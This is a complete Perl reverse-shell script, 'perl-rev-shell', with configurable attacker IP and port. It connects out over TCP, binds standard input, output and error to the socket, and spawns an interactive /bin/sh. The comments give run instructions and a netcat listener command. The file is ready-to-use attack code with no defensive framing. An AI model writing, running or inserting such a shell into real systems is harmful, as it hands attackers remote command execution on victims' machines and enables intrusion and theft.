#!/usr/bin/env perl
use strict;
use warnings;
use Socket;
use FileHandle;

#
# perl-rev-shell - Perl TCP Reverse Shell
#
# Perl is almost always available on Linux systems.
# Syntax check:  perl -c main.pl
# Run directly:  perl main.pl
# Or:            chmod +x main.pl && ./main.pl
#
# Listener:
#   nc -nlvp 4444
#

# -- CONFIGURE THESE --------------------------------------
my $ATTACKER_IP   = "10.10.10.10";
my $ATTACKER_PORT = 4444;
# ---------------------------------------------------------

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));

if (connect(SOCK, sockaddr_in($ATTACKER_PORT, inet_aton($ATTACKER_IP)))) {
    SOCK->autoflush(1);
    open(STDIN,  ">&SOCK");
    open(STDOUT, ">&SOCK");
    open(STDERR, ">&SOCK");
    exec("/bin/sh -i");
} else {
    die "[-] Connection failed: $!\n";
}
